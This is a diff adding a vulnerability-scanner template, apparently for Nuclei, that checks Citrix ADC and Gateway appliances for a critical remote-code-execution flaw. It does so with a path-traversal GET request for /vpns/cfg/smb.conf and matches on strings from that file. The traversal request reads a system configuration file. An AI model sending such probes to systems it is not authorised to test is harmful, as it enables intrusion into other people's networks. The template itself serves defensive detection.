@@ -1,0 +1,20 @@
+id: citrix-adc-gateway-rce
+info:
+  name: "Citrix ADC and Gateway 远程代码执行漏洞"
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: citrix
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/vpn/../vpns/cfg/smb.conf"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "encrypt passwords ="
+      - type: word
+        part: body
+        words:
+          - "[global]"
